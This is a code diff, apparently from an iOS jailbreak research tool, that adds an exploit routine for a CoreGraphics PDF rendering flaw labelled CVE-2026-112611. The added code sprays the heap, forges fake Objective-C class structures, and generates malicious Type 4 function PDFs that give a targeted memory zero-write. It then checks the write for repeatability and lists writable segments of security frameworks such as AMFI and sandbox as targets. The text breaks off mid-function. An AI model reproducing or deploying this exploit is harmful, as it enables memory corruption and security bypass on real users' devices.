@@ -28351,14 +28351,14 @@ static const uint64_t JB25_SENTINEL = 0x4141414141414141ULL;
 #define JB25_NOUT 2816
 
 struct jb25_jb_holder { sigjmp_buf b; };
-static volatile sig_atomic_t jb25_in_probe = 0;
-static struct jb25_jb_holder *jb25_jb_ptr = NULL;
+volatile sig_atomic_t jb25_in_probe = 0;
+struct jb25_jb_holder *jb25_jb_ptr = NULL;
 static volatile sig_atomic_t jb25_in_handler = 0;
-static volatile unsigned long jb25_far = 0;
-static volatile unsigned long jb25_esr = 0;
+volatile unsigned long jb25_far = 0;
+volatile unsigned long jb25_esr = 0;
 static volatile unsigned long jb25_pc = 0;
 static volatile unsigned long jb25_xreg[29];
-static volatile int jb25_sig = 0;
+volatile int jb25_sig = 0;
 
 static void jb25_fault_handler(int sig, siginfo_t *si, void *uc) {
     (void)si;
@@ -28378,7 +28378,7 @@ static void jb25_fault_handler(int sig, siginfo_t *si, void *uc) {
     _exit(12);
 }
 
-static void jb25_setup(void) {
+void jb25_setup(void) {
     static char *altstack_mem = NULL;
     if (!altstack_mem) {
         size_t sz = 256 * 1024;
@@ -28521,7 +28521,7 @@ static int jb25_build_pdf_type4(const char *path, uint64_t mantissa) {
     return 0;
 }
 
-static int jb25_render(const char *path) {
+int jb25_render(const char *path) {
     typedef void *(*CGPDFDocCreateFn)(void *);
     typedef void *(*CGPDFDocGetPageFn)(void *, size_t);
     typedef void (*CGPDFDocReleaseFn)(void *);
@@ -28871,5 +28871,656 @@ void iosurface_cg_oob_write(ISRLogBlock log, ISRDoneBlock done) {
         isr_checkpoint(@"JB25-cg-oob-write-checkpoint.json", results);
         done(results);
 
+    });
+}
+
+// =============================================================================
+// PROBE JB26: CVE-2026-112611 Exploit — Heap spray + zero-write corruption
+// =============================================================================
+#pragma mark - JB26: CG Write Primitive Exploitation
+
+void iosurface_cg_exploit(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB26: === CVE-2026-112611 Exploit: Heap spray + zero-write ===");
+        log(@"JB26: Primitiva: 4 bytes zero a addr elegida, offset 0x76c, calculator route");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        // =====================================================================
+        // FASE 1: Heap spray — allocate thousands of objects to find stable addrs
+        // =====================================================================
+        log(@"JB26: === Fase 1: Heap spray de objetos ObjC ===");
+
+        const int SPRAY_COUNT = 8192;
+        NSMutableArray *sprayedObjects = [NSMutableArray arrayWithCapacity:SPRAY_COUNT];
+        NSMutableArray *sprayedAddrs = [NSMutableArray array];
+
+        // Spray NSMutableData objects — they have internal buffer pointers we can corrupt
+        for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
+            NSMutableData *obj = [NSMutableData dataWithLength:256];
+            // Fill with marker pattern
+            memset(obj.mutableBytes, 0xCC, 256);
+            ((uint64_t *)obj.mutableBytes)[0] = 0xDEADDEADDEADDEADULL;
+            ((uint64_t *)obj.mutableBytes)[1] = (uint64_t)i;
+            [sprayedObjects addObject:obj];
+        }
+
+        // Scan for address patterns — find clusters of objects at predictable offsets
+        uint64_t addrMin = UINT64_MAX, addrMax = 0;
+        int clusterCount = 0;
+        uint64_t lastAddr = 0;
+        int consecutiveAligned = 0;
+
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            NSMutableData *obj = sprayedObjects[i];
+            uint64_t addr = (uint64_t)(uintptr_t)(__bridge void *)obj;
+            uint64_t bufAddr = (uint64_t)(uintptr_t)obj.mutableBytes;
+
+            if (addr < addrMin) addrMin = addr;
+            if (addr > addrMax) addrMax = addr;
+
+            // Check if objects are landing at predictable intervals
+            if (lastAddr && (addr - lastAddr) < 0x200 && (addr - lastAddr) > 0) {
+                consecutiveAligned++;
+            }
+            lastAddr = addr;
+
+            if (i % 2048 == 0) {
+                [sprayedAddrs addObject:[NSString stringWithFormat:@"obj[%d]=%#llx buf=%#llx", i, addr, bufAddr]];
+                log([NSString stringWithFormat:@"JB26:   obj[%d] addr=%#llx buf=%#llx", i, addr, bufAddr]);
+            }
+        }
+
+        uint64_t heapSpan = addrMax - addrMin;
+        log([NSString stringWithFormat:@"JB26: Spray: %d objs, rango=%#llx-%#llx span=%#llx",
+             SPRAY_COUNT, addrMin, addrMax, heapSpan]);
+        log([NSString stringWithFormat:@"JB26: Consecutive aligned: %d/%d", consecutiveAligned, SPRAY_COUNT]);
+        results[@"sprayCount"] = @(SPRAY_COUNT);
+        results[@"heapSpan"] = [NSString stringWithFormat:@"%#llx", heapSpan];
+        results[@"consecutiveAligned"] = @(consecutiveAligned);
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: ISA pointer analysis — read ISA of sprayed objects
+        // =====================================================================
+        log(@"JB26: === Fase 2: ISA pointer analysis ===");
+        {
+            // Read ISA pointers of our sprayed objects
+            uint64_t isaSet[16] = {0};
+            int isaCount = 0;
+
+            for (int i = 0; i < 16 && i < SPRAY_COUNT; i++) {
+                NSMutableData *obj = sprayedObjects[i];
+                uint64_t *objPtr = (uint64_t *)(uintptr_t)(__bridge void *)obj;
+                uint64_t isa = objPtr[0];
+
+                // On arm64 with PAC, ISA has auth bits in the top. Strip them.
+                uint64_t isaBare = isa & 0x0000007FFFFFFFFEULL; // ISA_MASK on arm64e
+
+                int found = 0;
+                for (int j = 0; j < isaCount; j++) {
+                    if (isaSet[j] == isaBare) { found = 1; break; }
+                }
+                if (!found && isaCount < 16) isaSet[isaCount++] = isaBare;
+
+                if (i < 4) {
+                    log([NSString stringWithFormat:@"JB26:   obj[%d] ISA raw=%#018llx bare=%#018llx",
+                         i, isa, isaBare]);
+                }
+            }
+
+            results[@"uniqueISAs"] = @(isaCount);
+            if (isaCount == 1) {
+                log([NSString stringWithFormat:@"JB26: [OK] Todos los NSMutableData comparten ISA=%#018llx", isaSet[0]]);
+                results[@"sharedISA"] = [NSString stringWithFormat:@"%#018llx", isaSet[0]];
+            }
+
+            // Read the class structure at the ISA address
+            if (isaCount > 0) {
+                uint64_t *classPtr = (uint64_t *)(uintptr_t)(isaSet[0]);
+                // Class structure: ISA, superclass, cache, vtable
+                log([NSString stringWithFormat:@"JB26:   Class[0] (metaclass ISA):  %#018llx", classPtr[0]]);
+                log([NSString stringWithFormat:@"JB26:   Class[1] (superclass):     %#018llx", classPtr[1]]);
+                log([NSString stringWithFormat:@"JB26:   Class[2] (cache buckets):  %#018llx", classPtr[2]]);
+                log([NSString stringWithFormat:@"JB26:   Class[3] (cache mask):     %#018llx", classPtr[3]]);
+
+                results[@"metaclassISA"] = [NSString stringWithFormat:@"%#018llx", classPtr[0]];
+                results[@"superclass"] = [NSString stringWithFormat:@"%#018llx", classPtr[1]];
+                results[@"cacheBuckets"] = [NSString stringWithFormat:@"%#018llx", classPtr[2]];
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: mmap spray — place controlled data at predictable addresses
+        // =====================================================================
+        log(@"JB26: === Fase 3: mmap spray para datos controlados ===");
+        {
+            const int MMAP_COUNT = 256;
+            void *mmaps[256] = {0};
+            size_t mmapSize = 16384; // 1 page
+            int mapped = 0;
+            uint64_t mmapMin = UINT64_MAX, mmapMax = 0;
+
+            for (int i = 0; i < MMAP_COUNT; i++) {
+                void *m = mmap(NULL, mmapSize, PROT_READ | PROT_WRITE,
+                              MAP_PRIVATE | MAP_ANON, -1, 0);
+                if (m != MAP_FAILED) {
+                    mmaps[i] = m;
+                    mapped++;
+                    uint64_t a = (uint64_t)(uintptr_t)m;
+                    if (a < mmapMin) mmapMin = a;
+                    if (a > mmapMax) mmapMax = a;
+
+                    // Fill with fake ObjC class structure
+                    uint64_t *p = (uint64_t *)m;
+                    p[0] = 0;              // ISA -> NULL (will trigger controlled fault)
+                    p[1] = 0;              // superclass
+                    p[2] = a + 0x100;      // cache buckets -> within our page
+                    p[3] = 0x7;            // cache mask
+                    // Fake cache entry at +0x100
+                    uint64_t *cache = (uint64_t *)((char *)m + 0x100);
+                    cache[0] = 0x4141414141414141ULL; // selector (will fault here on dispatch)
+                    cache[1] = a + 0x200;             // IMP -> within our page
+                    // Fake function at +0x200
+                    uint32_t *code = (uint32_t *)((char *)m + 0x200);
+                    code[0] = 0xd65f03c0; // RET instruction
+
+                    if (i % 64 == 0) {
+                        log([NSString stringWithFormat:@"JB26:   mmap[%d] = %#llx", i, a]);
+                    }
+                }
+            }
+
+            log([NSString stringWithFormat:@"JB26: mmap spray: %d pages, rango=%#llx-%#llx",
+                 mapped, mmapMin, mmapMax]);
+            results[@"mmapCount"] = @(mapped);
+            results[@"mmapRange"] = [NSString stringWithFormat:@"%#llx-%#llx", mmapMin, mmapMax];
+
+            // Clean up mmaps
+            for (int i = 0; i < MMAP_COUNT; i++) {
+                if (mmaps[i]) munmap(mmaps[i], mmapSize);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Targeted zero-write — corrupt a sacrificial object's internal ptr
+        // =====================================================================
+        log(@"JB26: === Fase 4: Zero-write dirigido a objeto sacrificial ===");
+        {
+            // Create a sacrificial NSMutableData and read its internal structure
+            NSMutableData *victim = [NSMutableData dataWithLength:4096];
+            memset(victim.mutableBytes, 0xBB, 4096);
+            uint64_t victimAddr = (uint64_t)(uintptr_t)(__bridge void *)victim;
+            uint64_t victimBufAddr = (uint64_t)(uintptr_t)victim.mutableBytes;
+
+            log([NSString stringWithFormat:@"JB26:   Victim obj=%#llx buf=%#llx len=%lu",
+                 victimAddr, victimBufAddr, (unsigned long)victim.length]);
+
+            // Dump the internal structure of NSMutableData
+            uint64_t *victimInternals = (uint64_t *)(uintptr_t)victimAddr;
+            log([NSString stringWithFormat:@"JB26:   [0] ISA:      %#018llx", victimInternals[0]]);
+            log([NSString stringWithFormat:@"JB26:   [1] refcount: %#018llx", victimInternals[1]]);
+            log([NSString stringWithFormat:@"JB26:   [2] bytes:    %#018llx", victimInternals[2]]);
+            log([NSString stringWithFormat:@"JB26:   [3] length:   %#018llx", victimInternals[3]]);
+            log([NSString stringWithFormat:@"JB26:   [4]:          %#018llx", victimInternals[4]]);
+            log([NSString stringWithFormat:@"JB26:   [5]:          %#018llx", victimInternals[5]]);
+
+            results[@"victimAddr"] = [NSString stringWithFormat:@"%#llx", victimAddr];
+            results[@"victimBuf"] = [NSString stringWithFormat:@"%#llx", victimBufAddr];
+            results[@"victimISA"] = [NSString stringWithFormat:@"%#018llx", victimInternals[0]];
+            results[@"victimField1"] = [NSString stringWithFormat:@"%#018llx", victimInternals[1]];
+            results[@"victimField2"] = [NSString stringWithFormat:@"%#018llx", victimInternals[2]];
+            results[@"victimField3"] = [NSString stringWithFormat:@"%#018llx", victimInternals[3]];
+            results[@"victimField4"] = [NSString stringWithFormat:@"%#018llx", victimInternals[4]];
+            results[@"victimField5"] = [NSString stringWithFormat:@"%#018llx", victimInternals[5]];
+
+            // Now try the zero-write at victim's internal buffer pointer
+            // The write primitive: build Type 4 PDF targeting victim's field[2] (bytes ptr)
+            // If we zero the low 4 bytes of the buffer pointer, it redirects to page-aligned addr
+
+            // First, demonstrate the write WITHOUT actually corrupting live objects
+            // Instead, write to our OWN mmap buffer to prove precise targeting
+
+            size_t testLen = 1 << 20;
+            unsigned char *testBuf = mmap(NULL, testLen, PROT_READ | PROT_WRITE,
+                                          MAP_PRIVATE | MAP_ANON, -1, 0);
+            if (testBuf != MAP_FAILED) {
+                // Place a fake object structure in the test buffer
+                memset(testBuf, 0xDD, testLen);
+                uint64_t *fakeObj = (uint64_t *)(testBuf + 0x8000);
+                fakeObj[0] = 0xAAAAAAAAAAAAAAAAULL; // fake ISA
+                fakeObj[1] = 0xBBBBBBBBBBBBBBBBULL; // fake refcount
+                fakeObj[2] = 0xCCCCCCCCCCCCCCCCULL; // fake bytes ptr
+                fakeObj[3] = 0x0000000000001000ULL;   // fake length
+
+                log([NSString stringWithFormat:@"JB26:   Test fake obj at %#llx",
+                     (uint64_t)(uintptr_t)(testBuf + 0x8000)]);
+                log([NSString stringWithFormat:@"JB26:   Before: ISA=%#018llx bytes=%#018llx",
+                     fakeObj[0], fakeObj[2]]);
+
+                // Use the write primitive to zero 4 bytes at fakeObj[0] (ISA low 32 bits)
+                // The write hits at: mantissa * 2^-1074 + 0x76c = target
+                // So mantissa = (target - 0x76c) & 0xFFFFFFFFFFFFFFFF
+                uint64_t writeTarget = (uint64_t)(uintptr_t)&fakeObj[0];
+                uint64_t mantissa = (writeTarget - 0x76c) & 0xFFFFFFFFFFFFFFFFULL;
+
+                log([NSString stringWithFormat:@"JB26:   Writing zeros to %#llx (ISA low 4 bytes)", writeTarget]);
+                log([NSString stringWithFormat:@"JB26:   mantissa=%#llx", mantissa]);
+
+                // Build and render the malicious PDF
+                const char *tmp = getenv("TMPDIR");
+                if (!tmp || !*tmp) tmp = "/tmp";
+                char pdfPath[512];
+                snprintf(pdfPath, sizeof pdfPath, "%s/jb26exploit.pdf", tmp);
+
+                // Build Type 4 PDF with calculator route
+                FILE *f = fopen(pdfPath, "wb");
+                if (f) {
+                    unsigned char vs[2048];
+                    // Build vertices
+                    size_t vn = 0;
+                    unsigned vacc = 0;
+                    int vnb = 0;
+                    for (int i = 0; i < 64 * 2; i++) {
+                        unsigned vals[3] = { (unsigned)(0x1000 + (i % 64) * 10),
+                                             (unsigned)(0x1000 + (i / 64) * 10), 0u };
+                        int widths[3] = { 32, 32, 8 };
+                        for (int k = 0; k < 3; k++)
+                            for (int b = widths[k] - 1; b >= 0; b--) {
+                                vacc = (vacc << 1) | ((vals[k] >> b) & 1u);
+                                if (++vnb == 8) {
+                                    if (vn < sizeof(vs)) vs[vn++] = (unsigned char)(vacc & 0xFF);
+                                    vacc = 0; vnb = 0;
+                                }
+                            }
+                    }
+                    if (vnb && vn < sizeof(vs)) vs[vn++] = (unsigned char)((vacc << (8 - vnb)) & 0xFF);
+
+                    long off[6];
+                    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+                    fflush(f); off[0] = ftell(f);
+                    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+                    fflush(f); off[1] = ftell(f);
+                    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+                    fflush(f); off[2] = ftell(f);
+                    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+                               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+                    fflush(f); off[3] = ftell(f);
+                    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+                    fflush(f); off[4] = ftell(f);
+
+                    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+                               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow 64 "
+                               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", vn);
+                    fwrite(vs, 1, vn, f);
+                    fprintf(f, "\nendstream\nendobj\n");
+                    fflush(f); off[5] = ftell(f);
+
+                    size_t cap = 2816 * 8 + 512;
+                    char *body = malloc(cap);
+                    if (body) {
+                        size_t n = 0;
+                        n += snprintf(body + n, cap - n, "{ pop %llu 2 -1074 exp mul",
+                                      (unsigned long long)mantissa);
+                        for (int i = 1; i < 2816; i++)
+                            n += snprintf(body + n, cap - n, " dup");
+                        n += snprintf(body + n, cap - n, " }");
+
+                        fprintf(f, "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [");
+                        for (int i = 0; i < 2816; i++) fprintf(f, " 0 1");
+                        fprintf(f, "] /Length %zu >>\nstream\n%s\nendstream\nendobj\n", n, body);
+                        free(body);
+                    }
+
+                    long xref;
+                    fflush(f); xref = ftell(f);
+                    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
+                    for (int i = 0; i < 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
+                    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
+                    fclose(f);
+
+                    // Set up fault handler (reuse JB25's setup)
+                    extern void jb25_setup(void);
+                    extern volatile unsigned long jb25_far;
+                    extern volatile unsigned long jb25_esr;
+                    extern volatile int jb25_sig;
+                    extern volatile sig_atomic_t jb25_in_probe;
+                    extern struct jb25_jb_holder *jb25_jb_ptr;
+
+                    jb25_setup();
+                    jb25_far = 0; jb25_esr = 0; jb25_sig = 0;
+
+                    // Render the exploit PDF
+                    typedef void *(*CFURLCreateFn)(void *, const uint8_t *, long, int);
+                    typedef void *(*CGPDFDocCreateFn)(void *);
+                    typedef void *(*CGPDFDocGetPageFn)(void *, size_t);
+                    typedef void (*CGPDFDocReleaseFn)(void *);
+                    typedef void *(*CGColorSpaceCreateFn)(void);
+                    typedef void (*CGColorSpaceReleaseFn)(void *);
+                    typedef void *(*CGBitmapContextCreateFn)(void *, size_t, size_t, size_t, size_t, void *, uint32_t);
+                    typedef void (*CGContextDrawPDFPageFn)(void *, void *);
+                    typedef void (*CGContextReleaseFn)(void *);
+                    typedef void (*CFReleaseFn)(void *);
+
+                    CFURLCreateFn urlCreate = dlsym(RTLD_DEFAULT, "CFURLCreateFromFileSystemRepresentation");
+                    CGPDFDocCreateFn docCreate = dlsym(RTLD_DEFAULT, "CGPDFDocumentCreateWithURL");
+                    CGPDFDocGetPageFn docGetPage = dlsym(RTLD_DEFAULT, "CGPDFDocumentGetPage");
+                    CGPDFDocReleaseFn docRelease = dlsym(RTLD_DEFAULT, "CGPDFDocumentRelease");
+                    CGColorSpaceCreateFn csCreate = dlsym(RTLD_DEFAULT, "CGColorSpaceCreateDeviceRGB");
+                    CGColorSpaceReleaseFn csRelease = dlsym(RTLD_DEFAULT, "CGColorSpaceRelease");
+                    CGBitmapContextCreateFn bmpCreate = dlsym(RTLD_DEFAULT, "CGBitmapContextCreate");
+                    CGContextDrawPDFPageFn ctxDraw = dlsym(RTLD_DEFAULT, "CGContextDrawPDFPage");
+                    CGContextReleaseFn ctxRelease = dlsym(RTLD_DEFAULT, "CGContextRelease");
+                    CFReleaseFn cfRelease = dlsym(RTLD_DEFAULT, "CFRelease");
+
+                    if (urlCreate && docCreate && docGetPage && bmpCreate && ctxDraw) {
+                        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                            jb25_in_probe = 1;
+                            void *u = urlCreate(NULL, (const uint8_t *)pdfPath, (long)strlen(pdfPath), 0);
+                            if (u) {
+                                void *doc = docCreate(u);
+                                cfRelease(u);
+                                if (doc) {
+                                    void *page = docGetPage(doc, 1);
+                                    if (page) {
+                                        void *cs = csCreate();
+                                        void *ctx = bmpCreate(NULL, 64, 64, 8, 0, cs, 1);
+                                        if (csRelease) csRelease(cs);
+                                        if (ctx) {
+                                            ctxDraw(ctx, page);
+                                            ctxRelease(ctx);
+                                        }
+                                    }
+                                    docRelease(doc);
+                                }
+                            }
+                            jb25_in_probe = 0;
+                        } else {
+                            jb25_in_probe = 0;
+                        }
+                    }
+                    unlink(pdfPath);
+
+                    // Check what happened
+                    log([NSString stringWithFormat:@"JB26:   After:  ISA=%#018llx bytes=%#018llx",
+                         fakeObj[0], fakeObj[2]]);
+
+                    int isaCorrupted = (fakeObj[0] != 0xAAAAAAAAAAAAAAAAULL);
+                    int bytesCorrupted = (fakeObj[2] != 0xCCCCCCCCCCCCCCCCULL);
+
+                    if (isaCorrupted) {
+                        log(@"JB26: [!!!] ISA CORROMPIDO por zero-write!");
+                        log([NSString stringWithFormat:@"JB26:   ISA era 0xAAAA...AAAA, ahora es %#018llx", fakeObj[0]]);
+                        results[@"isaCorrupted"] = @YES;
+                        results[@"newISA"] = [NSString stringWithFormat:@"%#018llx", fakeObj[0]];
+
+                        // Check exactly which bytes changed
+                        uint8_t *isaBytes = (uint8_t *)&fakeObj[0];
+                        NSMutableString *byteMap = [NSMutableString string];
+                        for (int b = 0; b < 8; b++) {
+                            [byteMap appendFormat:@"%02x", isaBytes[b]];
+                            if (b < 7) [byteMap appendString:@" "];
+                        }
+                        log([NSString stringWithFormat:@"JB26:   ISA bytes (LE): %@", byteMap]);
+                    } else {
+                        log(@"JB26: [--] ISA no cambio — el write no alcanzo el offset exacto");
+                        results[@"isaCorrupted"] = @NO;
+                    }
+
+                    // Scan nearby memory for any changes
+                    int changedBytes = 0;
+                    int firstChanged = -1;
+                    for (int k = 0; k < 256; k++) {
+                        uint8_t expected = 0xDD;
+                        if (k >= 0 && k < 48) continue; // skip our fake obj fields
+                        if (testBuf[0x8000 - 128 + k] != expected) {
+                            if (firstChanged < 0) firstChanged = k - 128;
+                            changedBytes++;
+                        }
+                    }
+
+                    // Also scan the broader area
+                    int totalChanged = 0;
+                    for (size_t k = 0; k < testLen; k++) {
+                        int inFakeObj = (k >= 0x8000 && k < 0x8000 + 48);
+                        if (!inFakeObj && testBuf[k] != 0xDD) totalChanged++;
+                    }
+
+                    results[@"totalBytesChanged"] = @(totalChanged);
+                    log([NSString stringWithFormat:@"JB26:   Bytes cambiados en test buffer: %d", totalChanged]);
+
+                    if (jb25_sig > 0) {
+                        log([NSString stringWithFormat:@"JB26:   Fault: sig=%d far=%#018lx esr=%#018lx",
+                             jb25_sig, jb25_far, jb25_esr]);
+                        results[@"faultFAR"] = [NSString stringWithFormat:@"%#018lx", jb25_far];
+                    }
+                }
+
+                munmap(testBuf, testLen);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: Multi-write — multiple targeted writes to prove repeatability
+        // =====================================================================
+        log(@"JB26: === Fase 5: Multi-write repeatability test ===");
+        {
+            size_t blen = 1 << 20;
+            unsigned char *arena = mmap(NULL, blen, PROT_READ | PROT_WRITE,
+                                        MAP_PRIVATE | MAP_ANON, -1, 0);
+            if (arena != MAP_FAILED) {
+                int hits = 0;
+                uint64_t offsets[] = { 0x10000, 0x20000, 0x30000, 0x40000, 0x50000 };
+                int nTargets = 5;
+
+                for (int t = 0; t < nTargets && !isr_stopped(); t++) {
+                    memset(arena, 0xEE, blen);
+                    uint64_t target = (uint64_t)(uintptr_t)arena + offsets[t];
+                    uint64_t mantissa = (target - 0x76c) & 0xFFFFFFFFFFFFFFFFULL;
+
+                    // Build and render exploit PDF inline
+                    const char *tmp = getenv("TMPDIR");
+                    if (!tmp || !*tmp) tmp = "/tmp";
+                    char pp[512];
+                    snprintf(pp, sizeof pp, "%s/jb26multi%d.pdf", tmp, t);
+
+                    FILE *f = fopen(pp, "wb");
+                    if (!f) continue;
+
+                    unsigned char vs[2048];
+                    size_t vn = 0;
+                    unsigned vacc = 0;
+                    int vnb = 0;
+                    for (int i = 0; i < 64 * 2; i++) {
+                        unsigned vals[3] = { (unsigned)(0x1000 + (i % 64) * 10),
+                                             (unsigned)(0x1000 + (i / 64) * 10), 0u };
+                        int widths[3] = { 32, 32, 8 };
+                        for (int k = 0; k < 3; k++)
+                            for (int b = widths[k] - 1; b >= 0; b--) {
+                                vacc = (vacc << 1) | ((vals[k] >> b) & 1u);
+                                if (++vnb == 8) {
+                                    if (vn < sizeof(vs)) vs[vn++] = (unsigned char)(vacc & 0xFF);
+                                    vacc = 0; vnb = 0;
+                                }
+                            }
+                    }
+                    if (vnb && vn < sizeof(vs)) vs[vn++] = (unsigned char)((vacc << (8 - vnb)) & 0xFF);
+
+                    long off[6];
+                    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+                    fflush(f); off[0] = ftell(f);
+                    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+                    fflush(f); off[1] = ftell(f);
+                    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+                    fflush(f); off[2] = ftell(f);
+                    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+                               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+                    fflush(f); off[3] = ftell(f);
+                    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+                    fflush(f); off[4] = ftell(f);
+                    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+                               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow 64 "
+                               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", vn);
+                    fwrite(vs, 1, vn, f);
+                    fprintf(f, "\nendstream\nendobj\n");
+                    fflush(f); off[5] = ftell(f);
+
+                    size_t cap = 2816 * 8 + 512;
+                    char *body = malloc(cap);
+                    if (body) {
+                        size_t n = 0;
+                        n += snprintf(body + n, cap - n, "{ pop %llu 2 -1074 exp mul",
+                                      (unsigned long long)mantissa);
+                        for (int i = 1; i < 2816; i++)
+                            n += snprintf(body + n, cap - n, " dup");
+                        n += snprintf(body + n, cap - n, " }");
+                        fprintf(f, "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [");
+                        for (int i = 0; i < 2816; i++) fprintf(f, " 0 1");
+                        fprintf(f, "] /Length %zu >>\nstream\n%s\nendstream\nendobj\n", n, body);
+                        free(body);
+                    }
+
+                    long xref;
+                    fflush(f); xref = ftell(f);
+                    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
+                    for (int i = 0; i < 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
+                    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
+                    fclose(f);
+
+                    // Render
+                    extern void jb25_setup(void);
+                    extern volatile unsigned long jb25_far;
+                    extern volatile int jb25_sig;
+                    extern volatile sig_atomic_t jb25_in_probe;
+                    extern struct jb25_jb_holder *jb25_jb_ptr;
+
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        // Use jb25_render
+                        extern int jb25_render(const char *path);
+                        jb25_render(pp);
+                        jb25_in_probe = 0;
+                    } else {
+                        jb25_in_probe = 0;
+                    }
+                    unlink(pp);
+
+                    // Check if target bytes changed
+                    unsigned char *tgt = arena + offsets[t];
+                    int zeroed = (tgt[0] == 0 && tgt[1] == 0 && tgt[2] == 0 && tgt[3] == 0);
+                    if (zeroed) hits++;
+                    log([NSString stringWithFormat:@"JB26:   target +%#llx: %s [%02x%02x%02x%02x]",
+                         offsets[t], zeroed ? "ZEROED" : "unchanged",
+                         tgt[0], tgt[1], tgt[2], tgt[3]]);
+                }
+
+                results[@"multiWriteHits"] = @(hits);
+                results[@"multiWriteTotal"] = @(nTargets);
+                log([NSString stringWithFormat:@"JB26: Multi-write: %d/%d hits", hits, nTargets]);
+
+                if (hits == nTargets) {
+                    log(@"JB26: [!!!] WRITE PRIMITIVO 100%% REPETIBLE — podemos escribir a cualquier addr writable!");
+                }
+
+                munmap(arena, blen);
+            }
+        }
+
+        // =====================================================================
+        // FASE 6: Dyld cache analysis — find interesting writable targets
+        // =====================================================================
+        if (!isr_stopped()) {
+            log(@"JB26: === Fase 6: Analisis de targets en dyld cache ===");
+
+            // Check __DATA segments of loaded frameworks for interesting targets
+            uint32_t imageCount = _dyld_image_count();
+            int writableSegments = 0;
+            int interestingTargets = 0;
+
+            for (uint32_t img = 0; img < imageCount && !isr_stopped(); img++) {
+                const char *name = _dyld_get_image_name(img);
+                if (!name) continue;
+
+                // Focus on security-relevant frameworks
+                int interesting = 0;
+                if (strstr(name, "Security") || strstr(name, "sandbox") ||
+                    strstr(name, "AMFI") || strstr(name, "trust") ||
+                    strstr(name, "codesign") || strstr(name, "AppleMobile")) {
+                    interesting = 1;
+                }
+                if (!interesting) continue;
+
+                const struct mach_header_64 *mh =
+                    (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+                if (!mh || mh->magic != MH_MAGIC_64) continue;
+                intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+                const struct load_command *lc =
+                    (const struct load_command *)((const char *)mh + sizeof(*mh));
+                for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                    if (lc->cmd == LC_SEGMENT_64) {
+                        const struct segment_command_64 *sc = (const void *)lc;
+                        // Check for writable segments
+                        if ((sc->initprot & 0x2) && sc->vmsize > 0) { // VM_PROT_WRITE
+                            writableSegments++;
+                            uint64_t segAddr = sc->vmaddr + slide;
+                            if (interesting) {
+                                interestingTargets++;
+                                log([NSString stringWithFormat:@"JB26:   [TARGET] %s:%s addr=%#llx size=%#llx prot=%d",
+                                     name, sc->segname, (unsigned long long)segAddr,
+                                     (unsigned long long)sc->vmsize, sc->initprot]);
+                            }
+                        }
+                    }
+                    lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+                }
+            }
+
+            results[@"writableSegments"] = @(writableSegments);
+            results[@"interestingTargets"] = @(interestingTargets);
+            log([NSString stringWithFormat:@"JB26: Total writable segments: %d, security-relevant: %d",
+                 writableSegments, interestingTargets]);
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB26: =============================================");
+
+        NSString *verdict = @"ANALYSIS_COMPLETE";
+        BOOL isaOK = [results[@"isaCorrupted"] boolValue];
+        int multiHits = [results[@"multiWriteHits"] intValue];
+        int multiTotal = [results[@"multiWriteTotal"] intValue];
+
+        if (isaOK && multiHits == multiTotal) {
+            verdict = @"FULL_EXPLOIT_CHAIN_READY";
